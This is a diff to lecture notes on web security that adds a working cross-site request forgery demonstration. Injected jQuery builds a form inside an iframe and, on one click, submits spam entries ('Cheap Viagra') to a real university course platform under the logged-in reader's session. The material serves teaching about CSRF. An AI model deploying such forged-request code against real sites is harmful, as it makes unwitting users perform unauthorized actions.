@@ -471,12 +471,39 @@ The attacker gains access to the confidential data as if she were the legitimate
 > 2. Go to [the course page](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946).
 > 3. Now, suppose you visit a random site (e.g. this site!!!), containing the following **`<iframe>`** (hidden with [**`display:none`**](javascript:hide_frame\(\))):
 
-<iframe id="ecampus" style="width:80%;height:2em;margin:auto;display:block">
+<iframe id="ecampus" style="width:80%;height:4em;margin:auto;display:block">
 </iframe>
 
 <script>
+$(function() {
+  var form = $('#ecampus').contents().find('body')
+    .html('<form id="ecampus-form" method="GET" action="http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946/cours_plan_form"></form>')
+    .find('#ecampus-form');
 
+  var data = {
+      typeElement: 'TexteLibre',
+      titreElement: 'Cheap Viagra',
+      createurElement: 'Hacker',
+      'form.submitted': '1',
+      'form.button.save': 'label_save'
+  };
+
+  for (k in data) {
+    form.append('<input type="text" name="' + k + '" value="' + data[k] + '" />');
+  }
+
+  form.append('<input type="submit" value="Submit" />');  
+});
+
+function csrf() {
+  $('#ecampus').contents().find('#ecampus-form').submit();
+}
+
+function hide_frame() {
+  $('#ecampus').toggle('slow');
+}
 </script>
+
 
 > 4. [If you click here](javascript:csrf\(\)), the form is submitted and the [CSRF]() is run.
 > 5. Now refresh [the course page](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946) and see what's happened.
